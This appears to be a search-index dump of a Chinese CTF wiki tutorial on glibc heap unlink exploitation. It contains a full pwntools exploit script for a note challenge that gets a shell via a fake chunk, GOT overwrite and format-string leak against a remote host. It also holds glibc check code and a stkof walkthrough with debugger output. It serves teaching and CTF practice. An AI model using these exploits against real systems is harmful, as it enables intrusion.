note3\u4f7fcurrent_ptr\u6307\u5411note3\uff0c\u4e4b\u540e\u4f7f\u7528-1\u6ea2\u51fanote3\n\nnew(512,\na\n)\nnew(512,\na\n)\nnew(512,\na\n)\nnew(512,\na\n)\nnew(512,\na\n)\nnew(512,\na\n)\nnew(512,\na\n)\nnew(512,\na\n)\n\nedit(3,\na\n)\nedit(-9223372036854775808,data);\n\n\n\n\u6211\u4eec\u4f7f\u7528\u7684\u6ea2\u51fa\u6570\u636e\u662f\u7528\u4e8e\u6784\u9020\u4e00\u4e2afake chunk\u6765\u5b9e\u73b0safe unlink\u7684\u5229\u7528\uff0c\u5177\u4f53\u7684\u539f\u7406\u53ef\u4ee5\u770b\u8fd9\u4e00\u7ae0\u8282\u7684\u8bb2\u89e3\u3002\n\n\ndata = \n\ndata += p64(0) + p64(512+1) #fake chunk header\ndata += p64(0x6020e0-0x18) + p64(0x6020e0-0x10) #fake fd and bk \ndata += \nA\n*(512-32) \ndata += p64(512) + p64(512+16) \n\n\n\n\n\u4e4b\u540e\u91ca\u653enote4\uff0cnote3\u4e0enote4\u5c31\u4f1a\u5408\u5e76\u3002note3_ptr\u4f1a\u6307\u5411note0_ptr\u7684\u4f4d\u7f6e\u3002\u8fd9\u6837\u6211\u4eec\u901a\u8fc7\u4e0d\u65ad\u7684\u4fee\u6539note0_ptr\u7684\u503c\u548cedit note0\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u6570\u636e\u3002\n\n\n\u4f46\u662f\u9898\u76ee\u6ca1\u6709\u63d0\u4f9bshow\u529f\u80fd\uff0c\u6240\u4ee5\u65e0\u6cd5\u8fdb\u884c\u4efb\u610f\u5730\u5740\u8bfb\uff0c\u4e5f\u5c31\u65e0\u6cd5\u6cc4\u6f0f\u6570\u636e\u3002\n\u8fd9\u91cc\u91c7\u7528\u7684\u529e\u6cd5\u662f\u628afree\u7684got\u8868\u6539\u4e3aprintf\u7684\u503c\uff0c\u7136\u540e\u5728bbs\u4e2d\u4e00\u5757\u7a7a\u767d\u7684\u533a\u57df\u5199\u5165\"%x\"\u3002\n\u8fd9\u6837\u5f53free\u8fd9\u5757\u533a\u57df\uff08\u8fd9\u5757\u533a\u57df\u5728ptr_array\u4e2d\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u4f20\u9012\u7ed9free\uff09\uff0c\u5c31\u53ef\u4ee5\u6cc4\u6f0f\u51fa\u6808\u4e2d\u7684\u6570\u636e\u3002\n\u901a\u8fc7\u6808\u4e2d\u7684libc\u5730\u5740\u6c42\u51fasystem\u7684\u5730\u5740\u5c31\u53ef\u4ee5\u5229\u7528\u4efb\u610f\u5730\u5740\u5199\u83b7\u5f97shell\n\n\nfree(4)\n\nedit(3,free_got)\nedit(0,printf_plt)\n\nedit(3,p64(0x6020e8))\nedit(0,\n%llx.\n*30)\n\n\n\u5b8c\u6210\u7684exp\u5982\u4e0b\n\n\n#!/usr/bin/python\n# -*- coding: utf-8 -*-\nfrom pwn import *\nimport time\ndef malloc(size,data):\n    print conn.recvuntil(\n)\n    conn.sendline(\n1\n)\n    print conn.recvuntil(\n1024)\n)\n    conn.sendline(str(size))\n    print conn.recvuntil(\ncontent:\n)\n    conn.sendline(data)\n    print conn.recvuntil(\n\\n\n)\ndef edit(id,data):\n    print conn.recvuntil(\n)\n    conn.sendline(\n3\n)\n    print conn.recvuntil(\nnote:\n)\n    conn.sendline(str(id))\n    print conn.recvuntil(\nent:\n)\n    conn.sendline(data)\n    print conn.recvuntil(\nsuccess\n)\ndef free(id):\n    print conn.recvuntil(\n)\n    conn.sendline(\n4\n)\n    print conn.recvuntil(\nnote:\n)\n    conn.sendline(str(id))\n    print conn.recvuntil(\nsuccess\n)\n\n#conn = remote(\n127.0.0.1\n,9999)\nconn = remote(\n115.28.27.103\n,9003)\nfree_got = p64(0x602018)\nputs_got = p64(0x602020)\nstack_got = p64(0x602038)\nprintf_got = p64(0x602030)\nexit_got = p64(0x602078)\nprintf_plt = p64(0x400750)\nputs_plt = p64(0x400730)\n#libcstartmain_ret_off = 0x21b45\n#sys_off = 0x414f0\nlibcstartmain_ret_off = 0x21ec5\nsys_off = 0x46640\n# 1. int overflow lead to double free\nintoverflow = -9223372036854775808\nmalloc(512,\n/bin/sh\\0\n)\nmalloc(512,\n/bin/sh\\0\n)\nmalloc(512,\n/bin/sh\\0\n)\nmalloc(512,\n/bin/sh\\0\n)\nmalloc(512,\n/bin/sh\\0\n)\nmalloc(512,\n/bin/sh\\0\n)\nmalloc(512,p64(0x400ef8))\nmalloc(512,\n/bin/sh\\0\n)\n# 2. make a fake chunk and modify the next chunk\ns pre size \nfakechunk = p64(0) + p64(512+1) + p64(0x6020e0-0x18) + p64(0x6020e0-0x10) + \nA\n*(512-32) + p64(512) + p64(512+16)\nedit(3,\naaaaaa\n)\nedit(intoverflow,fakechunk)\n# 3. double free\nfree(4)\n# 4. overwrite got\nedit(3,free_got)\nedit(0,printf_plt+printf_plt)\n# 5. leak the stack data\nedit(3,p64(0x6020e8))\nedit(0,\n%llx.\n*30)\n#free-\nputs\nprint conn.recvuntil(\n)\nconn.sendline(\n4\n)\nprint conn.recvuntil(\nnote:\n)\nconn.sendline(str(0))\n#time.sleep(0.3)\nret =  conn.recvuntil(\nsuccess\n)\nprint ret\n# 6. calcuate the system\ns addr\nlibcstart = ret.split(\n.\n)[10]\nlibcstart_2 = int(libcstart,16) - libcstartmain_ret_off\nprint \nlibc start addr:\n,hex(libcstart_2)\nsystem_addr = libcstart_2 + sys_off\nprint \nsystem_addr:\n,hex(system_addr)\n# 7. overwrite free\ns got\nedit(3,free_got)\nedit(0,p64(system_addr)+printf_plt)\n# 8. write argv\nedit(3,p64(0x6020d0))\nedit(0,\n/bin/sh\\0\n)\n# 9. exploit\nprint conn.recvuntil(\n)\nconn.sendline(\n4\n)\nprint conn.recvuntil(\nnote:\n)\nconn.sendline(str(0))\nsleep(0.2)\nconn.interactive()", 
            "title": "Unlink"
        }, 
        {
            "location": "/pwn/heap/unlink/#unlink", 
            "text": "", 
            "title": "Unlink"
        }, 
        {
            "location": "/pwn/heap/unlink/#_1", 
            "text": "\u6211\u4eec\u5728\u5229\u7528 unlink \u6240\u9020\u6210\u7684\u6f0f\u6d1e\u65f6\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9\u8fdb\u884c unlink chunk \u8fdb\u884c\u5185\u5b58\u5e03\u5c40\uff0c\u7136\u540e\u501f\u52a9 unlink \u64cd\u4f5c\u6765\u8fbe\u6210\u4fee\u6539\u6307\u9488\u7684\u6548\u679c\u3002  \u6211\u4eec\u5148\u6765\u7b80\u5355\u56de\u987e\u4e00\u4e0b unlink \u7684\u76ee\u7684\u4e0e\u8fc7\u7a0b\uff0c\u5176\u76ee\u7684\u662f\u628a\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u4e2d\u7684\u7a7a\u95f2\u5757\u62ff\u51fa\u6765\uff0c\u7136\u540e\u548c\u76ee\u524d\u7269\u7406\u76f8\u90bb\u7684 free chunk \u8fdb\u884c\u5408\u5e76\u3002\u5176\u57fa\u672c\u7684\u8fc7\u7a0b\u5982\u4e0b   \u4e0b\u9762\u6211\u4eec\u9996\u5148\u4ecb\u7ecd\u4e00\u4e0b unlink \u6700\u521d\u6ca1\u6709\u9632\u62a4\u65f6\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u7136\u540e\u4ecb\u7ecd\u76ee\u524d\u5229\u7528 unlink \u7684\u65b9\u5f0f\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/unlink/#unlink_1", 
            "text": "\u5728\u6700\u521d unlink \u5b9e\u73b0\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u662f\u6ca1\u6709\u5bf9\u53cc\u5411\u94fe\u8868\u68c0\u67e5\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6ca1\u6709\u4ee5\u4e0b\u7684\u4ee3\u7801\u3002  // \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002  if   ( __builtin_expect   ( chunksize ( P )   !=   prev_size   ( next_chunk ( P )),   0 ))       \\\n       malloc_printerr   ( corrupted size vs. prev_size );                \\ // fd bk  if   ( __builtin_expect   ( FD - bk   !=   P   ||   BK - fd   !=   P ,   0 ))                       \\\n   malloc_printerr   ( check_action ,   corrupted double-linked list ,   P ,   AV );   \\\n\n   // next_size related \n               if   ( __builtin_expect   ( P - fd_nextsize - bk_nextsize   !=   P ,   0 )               \\\n                 ||   __builtin_expect   ( P - bk_nextsize - fd_nextsize   !=   P ,   0 ))     \\\n               malloc_printerr   ( check_action ,                                       \\\n                                corrupted double-linked list (not small) ,     \\\n                                P ,   AV );      \u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u4e3a\u4f8b \uff0c\u5047\u8bbe\u5806\u5185\u5b58\u6700\u521d\u7684\u5e03\u5c40\u662f\u4e0b\u9762\u7684\u6837\u5b50   \u90a3\u4e48\u5982\u679c\u6211\u4eec\u901a\u8fc7\u67d0\u79cd\u65b9\u5f0f\uff08 \u6bd4\u5982\u6ea2\u51fa \uff09\u5c06 Nextchunk \u7684 fd \u548c bk \u6307\u9488\u4fee\u6539\u4e3a\u6307\u5b9a\u7684\u503c\u3002\u5219\u5f53\u6211\u4eecfree(Q)\u65f6   glibc \u5224\u65ad\u8fd9\u4e2a\u5757\u662f small chunk\u3002  \u5224\u65ad\u524d\u5411\u5408\u5e76\uff0c\u53d1\u73b0\u524d\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u4e0d\u9700\u8981\u524d\u5411\u5408\u5e76\u3002  \u5224\u65ad\u540e\u5411\u5408\u5e76\uff0c\u53d1\u73b0\u540e\u4e00\u4e2a chunk \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\uff0c\u9700\u8981\u5408\u5e76\u3002  \u7ee7\u800c\u5bf9 nextchunk \u91c7\u53d6 unlink \u64cd\u4f5c\u3002   \u90a3\u4e48 unlink \u5177\u4f53\u6267\u884c\u7684\u6548\u679c\u662f\u4ec0\u4e48\u6837\u5b50\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u6765\u5206\u6790\u4e00\u4e0b   FD=P- fd = target addr -12  BK=P- bk = expect value  FD- bk = BK\uff0c\u5373 *(target addr-12+12)=BK=expect value  BK- fd = FD\uff0c\u5373*(expect value +8) = FD = target addr-12   \u770b\u8d77\u6765\u6211\u4eec\u4f3c\u4e4e\u53ef\u4ee5\u901a\u8fc7 unlink \u76f4\u63a5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u76ee\u7684\uff0c\u4f46\u662f\u6211\u4eec\u8fd8\u662f\u9700\u8981\u786e\u4fdd expect value +8 \u5730\u5740\u5177\u6709\u53ef\u5199\u7684\u6743\u9650\u3002  \u6bd4\u5982\u8bf4\u6211\u4eec\u5c06 target addr \u8bbe\u7f6e\u4e3a\u67d0\u4e2a got \u8868\u9879\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u8c03\u7528\u5bf9\u5e94\u7684 libc \u51fd\u6570\u65f6\uff0c\u5c31\u4f1a\u76f4\u63a5\u6267\u884c\u6211\u4eec\u8bbe\u7f6e\u7684\u503c\uff08expect value\uff09\u5904\u7684\u4ee3\u7801\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cexpect value+8 \u5904\u7684\u503c\u88ab\u7834\u574f\u4e86\uff0c\u9700\u8981\u60f3\u529e\u6cd5\u7ed5\u8fc7\u3002", 
            "title": "\u53e4\u8001\u7684 unlink"
        }, 
        {
            "location": "/pwn/heap/unlink/#unlink_2", 
            "text": "\u4f46\u662f\uff0c\u73b0\u5b9e\u662f\u6b8b\u9177\u7684\u3002\u3002 \u6211\u4eec\u521a\u624d\u8003\u8651\u7684\u662f\u6ca1\u6709\u68c0\u67e5\u7684\u60c5\u51b5\uff0c\u4f46\u662f\u4e00\u65e6\u52a0\u4e0a\u68c0\u67e5\uff0c\u5c31\u6ca1\u6709\u8fd9\u4e48\u7b80\u5355\u4e86\u3002\u6211\u4eec\u770b\u4e00\u4e0b\u5bf9 fd \u548c bk \u7684\u68c0\u67e5  // fd bk  if   ( __builtin_expect   ( FD - bk   !=   P   ||   BK - fd   !=   P ,   0 ))                       \\\n   malloc_printerr   ( check_action ,   corrupted double-linked list ,   P ,   AV );   \\  \u6b64\u65f6   FD- bk = target addr - 12 + 12=target_addr  BK- fd = expect value + 8   \u90a3\u4e48\u6211\u4eec\u4e0a\u9762\u6240\u5229\u7528\u7684\u4fee\u6539 GOT \u8868\u9879\u7684\u65b9\u6cd5\u5c31\u53ef\u80fd\u4e0d\u53ef\u7528\u4e86\u3002\u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u5f97 expect value+8 \u4ee5\u53ca target_addr \u7b49\u4e8e P\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6267\u884c   *P= expect value = P - 8  *P = target addr -12 = P - 12   \u5373\u6539\u5199\u4e86\u6307\u9488 P \u7684\u5185\u5bb9\uff0c\u5c06\u5176\u6307\u5411\u4e86\u6bd4\u81ea\u5df1\u4f4e 12 \u7684\u5730\u5740\u5904\u3002  \u800c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4f7f\u5f97\u4e24\u8005\u90fd\u6307\u5411 P\uff0c\u53ea\u9700\u8981\u5b89\u88c5\u5982\u4e0b\u65b9\u5f0f\u4fee\u6539\u5373\u53ef   \u6211\u4eec\u4f1a\u901a\u8fc7\u4e4b\u540e\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\uff0c\u6211\u4eec\u8fd9\u6837\u7684\u4fee\u6539\u662f\u53ef\u4ee5\u8fbe\u5230\u4e00\u5b9a\u7684\u6548\u679c\u7684\u3002  \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6211\u4eec\u5e76\u6ca1\u6709\u8fdd\u80cc\u4e0b\u9762\u7684\u7ea6\u675f\u3002       // \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 \n     if   ( __builtin_expect   ( chunksize ( P )   !=   prev_size   ( next_chunk ( P )),   0 ))       \\\n       malloc_printerr   ( corrupted size vs. prev_size );                \\  \u6b64\u5916\uff0c\u5176\u5b9e\u5982\u679c\u6211\u4eec\u8bbe\u7f6enext chunk \u7684 fd \u548c bk \u5747\u4e3a nextchunk \u7684\u5730\u5740\u4e5f\u662f\u53ef\u4ee5\u7ed5\u8fc7\u4e0a\u9762\u7684\u68c0\u6d4b\u7684\u3002\u4f46\u662f\u8fd9\u6837\u7684\u8bdd\uff0c\u5e76\u4e0d\u80fd\u8fbe\u5230\u4fee\u6539\u6307\u9488\u5185\u5bb9\u7684\u6548\u679c\u3002", 
            "title": "\u5f53\u524d\u7684 unlink"
        }, 
        {
            "location": "/pwn/heap/unlink/#2014-hitcon-stkof", 
            "text": "", 
            "title": "2014 HITCON stkof"
        }, 
        {
            "location": "/pwn/heap/unlink/#_2", 
            "text": "\u279c  2014_hitcon_stkof git: ( master )  file stkof   \nstkof: ELF  64 -bit LSB executable, x86-64, version  1   ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  for  GNU/Linux  2 .6.32, BuildID [ sha1 ]= 4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped\n\u279c  2014_hitcon_stkof git: ( master )  checksec stkof         [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2014_hitcon_stkof/stkof \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u548c NX \u4fdd\u62a4\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/unlink/#_3", 
            "text": "\u7a0b\u5e8f\u51e0\u4e4e\u5565\u8f93\u51fa\u4e5f\u6ca1\u6709\uff0c\u53ea\u80fd\u786c\u770b\u4e86\uff0c\u5927\u6982\u662f\u4e00\u4e2a\u5185\u5b58\u5206\u914d\u5668\uff0c\u5dee\u4e0d\u591a\u6709\u56db\u4e2a\u529f\u80fd   1\uff0c\u5206\u914d\u6307\u5b9a\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u5e76\u5728bss\u6bb5\u8bb0\u5f55\u5bf9\u5e94 chunk \u7684\u6307\u9488\uff0c\u5047\u8bbe\u5176\u4e3aglobal\u3002  2\uff0c\u6839\u636e\u6307\u5b9a\u7d22\u5f15\uff0c\u4ee5\u53ca\u6307\u5b9a\u5927\u5c0f\u5411\u6307\u5b9a\u5185\u5b58\u5904\uff0c\u8bfb\u5165\u6570\u636e\u3002 \u53ef\u89c1\uff0c\u8fd9\u91cc\u5b58\u5728\u5806\u6ea2\u51fa\u7684\u60c5\u51b5\uff0c\u56e0\u4e3a\u8fd9\u91cc\u8bfb\u5165\u5b57\u8282\u7684\u5927\u5c0f\u662f\u7531\u6211\u4eec\u6765\u63a7\u5236\u7684\u3002  3\uff0c\u6839\u636e\u6307\u5b9a\u7d22\u5f15\uff0c\u91ca\u653e\u5df2\u7ecf\u5206\u914d\u7684\u5185\u5b58\u5757\u3002  4\uff0c\u8fd9\u4e2a\u529f\u80fd\u5e76\u6ca1\u6709\u4ec0\u4e48\u4e71\u7528\uff0c\u672c\u6765\u4ee5\u4e3a\u662f\u53ef\u4ee5\u8f93\u51fa\u5185\u5bb9\uff0c\u7ed3\u679c\u4ec0\u4e48\u4e5f\u6ca1\u6709\u8f93\u51fa\u3002\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/unlink/#_4", 
            "text": "\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u6ca1\u6709\u8fdb\u884c setbuf \u64cd\u4f5c\uff0c\u6240\u4ee5\u5728\u6267\u884c\u8f93\u5165\u8f93\u51fa\u64cd\u4f5c\u7684\u65f6\u5019\u4f1a\u7533\u8bf7\u7f13\u51b2\u533a\u3002\u8fd9\u91cc\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u4f1a\u7533\u8bf7\u4e24\u4e2a\u7f13\u51b2\u533a\uff0c\u5206\u522b\u5927\u5c0f\u4e3a1024 \u548c 1024\u3002\u5177\u4f53\u5982\u4e0b\uff0c\u53ef\u4ee5\u8fdb\u884c\u8c03\u8bd5\u67e5\u770b  \u521d\u6b21\u8c03\u7528 fgets \u65f6\uff0cmalloc\u4f1a\u5206\u914d\u7f13\u51b2\u533a 1024 \u5927\u5c0f\u3002  *RAX  0x0\n*RBX  0x400\n*RCX  0x7ffff7b03c34 (__fxstat64+20) \u25c2\u2014 cmp    rax, -0x1000 /*  H=  */\n*RDX  0x88\n*RDI  0x400\n*RSI  0x7fffffffd860 \u25c2\u2014 0x16\n*R8   0x1\n*R9   0x0\n*R10  0x7ffff7fd2700 \u25c2\u2014 0x7ffff7fd2700\n*R11  0x246\n*R12  0xa\n*R13  0x9\n R14  0x0\n*R15  0x7ffff7dd18e0 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2288\n*RBP  0x7ffff7dd18e0 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2288\n*RSP  0x7fffffffd858 \u2014\u25b8 0x7ffff7a7a1d5 (_IO_file_doallocate+85) \u25c2\u2014 mov    rsi, rax\n*RIP  0x7ffff7a91130 (malloc) \u25c2\u2014 push   rbp\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba 0x7ffff7a91130  malloc         push   rbp  0x7ffff7dd18e0 \n...\uff0c\u7701\u7565\n \u25ba f 0     7ffff7a91130 malloc\n   f 1     7ffff7a7a1d5 _IO_file_doallocate+85\n   f 2     7ffff7a88594 _IO_doallocbuf+52\n   f 3     7ffff7a8769c _IO_file_underflow+508\n   f 4     7ffff7a8860e _IO_default_uflow+14\n   f 5     7ffff7a7bc6a _IO_getline_info+170\n   f 6     7ffff7a7bd78\n   f 7     7ffff7a7ab7d fgets+173\n   f 8           400d2e\n   f 9     7ffff7a2d830 __libc_start_main+240  \u5206\u914d\u4e4b\u540e\uff0c\u5806\u5982\u4e0b  pwndbg  heap\nTop Chunk: 0xe05410\nLast Remainder: 0\n\n0xe05000 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0xe05410 PREV_INUSE {\n  prev_size = 0, \n  size = 134129, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}  \u5f53\u5206\u914d16\u5927\u5c0f\u7684\u5185\u5b58\u540e\uff0c\u5806\u5e03\u5c40\u5982\u4e0b  pwndbg  heap\nTop Chunk: 0xe05430\nLast Remainder: 0\n\n0xe05000 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0xa3631, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0xe05410 FASTBIN {\n  prev_size = 0, \n  size = 33, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x20bd1\n}\n0xe05430 PREV_INUSE {\n  prev_size = 0, \n  size = 134097, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}  \u5f53\u4f7f\u7528 printf \u51fd\u6570\uff0c\u4f1a\u5206\u914d 1024 \u5b57\u8282\u7a7a\u95f4\uff0c\u5982\u4e0b  *RAX  0x0\n*RBX  0x400\n*RCX  0x7ffff7b03c34 (__fxstat64+20) \u25c2\u2014 cmp    rax, -0x1000 /*  H=  */\n*RDX  0x88\n*RDI  0x400\n*RSI  0x7fffffffd1c0 \u25c2\u2014 0x16\n R8   0x0\n*R9   0x0\n*R10  0x0\n*R11  0x246\n*R12  0x1\n*R13  0x7fffffffd827 \u25c2\u2014 0x31 /*  1  */\n R14  0x0\n*R15  0x400de4 \u25c2\u2014 and    eax, 0x2e000a64 /*  %d\\n  */\n*RBP  0x7ffff7dd2620 (_IO_2_1_stdout_) \u25c2\u2014 0xfbad2284\n*RSP  0x7fffffffd1b8 \u2014\u25b8 0x7ffff7a7a1d5 (_IO_file_doallocate+85) \u25c2\u2014 mov    rsi, rax\n*RIP  0x7ffff7a91130 (malloc) \u25c2\u2014 push   rbp\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba 0x7ffff7a91130  malloc        push   rbp  0x7ffff7dd2620 \n\u3002\u3002\u3002\u7701\u7565\n\u25ba f 0     7ffff7a91130 malloc\n   f 1     7ffff7a7a1d5 _IO_file_doallocate+85\n   f 2     7ffff7a88594 _IO_doallocbuf+52\n   f 3     7ffff7a878f8 _IO_file_overflow+456\n   f 4     7ffff7a8628d _IO_file_xsputn+173\n   f 5     7ffff7a5ae00 vfprintf+3216\n   f 6     7ffff7a62899 printf+153\n   f 7           4009cd\n   f 8           400cb1\n   f 9     7ffff7a2d830 __libc_start_main+240  \u5806\u5e03\u5c40\u5982\u4e0b  pwndbg  heap\nTop Chunk: 0xe05840\nLast Remainder: 0\n\n0xe05000 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0xa3631, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0xe05410 FASTBIN {\n  prev_size = 0, \n  size = 33, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x411\n}\n0xe05430 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0xa4b4f, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0xe05840 PREV_INUSE {\n  prev_size = 0, \n  size = 133057, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}  \u6b64\u540e\uff0c\u65e0\u8bba\u662f\u8f93\u5165\u8f93\u51fa\u90fd\u4e0d\u4f1a\u518d\u7533\u8bf7\u7f13\u51b2\u53bb\u4e86\u3002\u6240\u4ee5\u6211\u4eec\u6700\u597d\u6700\u521d\u7684\u7533\u8bf7\u4e00\u4e2a chunk \u6765\u628a\u8fd9\u4e9b\u7f13\u51b2\u533a\u7ed9\u7533\u8bf7\u4e86\uff0c\u65b9\u4fbf\u4e4b\u540e\u64cd\u4f5c\u3002  \u4f46\u662f\uff0c\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\uff0c\u5982\u679c\u6211\u4eec\u662f attach \u4e0a\u53bb\u7684\u8bdd\uff0c\u7b2c\u4e00\u4e2a\u7f13\u51b2\u533a\u5206\u914d\u7684\u5927\u5c0f\u4e3a 4096 \u5927\u5c0f\u3002  pwndbg  heap\nTop Chunk: 0x1e9b010\nLast Remainder: 0\n\n0x1e9a000 PREV_INUSE {\n  prev_size = 0, \n  size = 4113, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0x1e9b010 PREV_INUSE {\n  prev_size = 0, \n  size = 135153, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}", 
            "title": "\u521d\u6b65\u6d4b\u8bd5"
        }, 
        {
            "location": "/pwn/heap/unlink/#_5", 
            "text": "\u6839\u636e\u4e0a\u9762\u5206\u6790\uff0c\u6211\u4eec\u5728\u524d\u9762\u5148\u5206\u914d\u4e00\u4e2a chunk \u6765\u628a\u7f13\u51b2\u533a\u5206\u914d\u5b8c\u6bd5\uff0c\u4ee5\u514d\u5f71\u54cd\u4e4b\u540e\u7684\u64cd\u4f5c\u3002  \u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u6ca1\u6709 leak\uff0c\u8981\u60f3\u6267\u884c system \u7b49\u51fd\u6570\uff0c\u6211\u4eec\u7684\u9996\u8981\u76ee\u7684\u8fd8\u662f\u5148\u6784\u9020 leak\uff0c\u57fa\u672c\u601d\u8def\u5982\u4e0b   \u5229\u7528 unlink \u4fee\u6539 global[2] \u4e3a  global[2]-0x18\u3002  \u5229\u7528\u7f16\u8f91\u529f\u80fd\u4fee\u6539 global[0] \u4e3a free@got \u5730\u5740\uff0c\u540c\u65f6\u4fee\u6539 global[1] \u4e3aputs@got \u5730\u5740\uff0cglobal[2] \u4e3a atoi@got \u5730\u5740\u3002  \u4fee\u6539  free@got  \u4e3a  puts@plt  \u7684\u5730\u5740\uff0c\u4ece\u800c\u5f53\u518d\u6b21\u8c03\u7528  free  \u51fd\u6570\u65f6\uff0c\u5373\u53ef\u76f4\u63a5\u8c03\u7528 puts \u51fd\u6570\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u6cc4\u6f0f\u51fd\u6570\u5185\u5bb9\u3002   free global[2]\uff0c\u5373\u6cc4\u6f0f puts@got 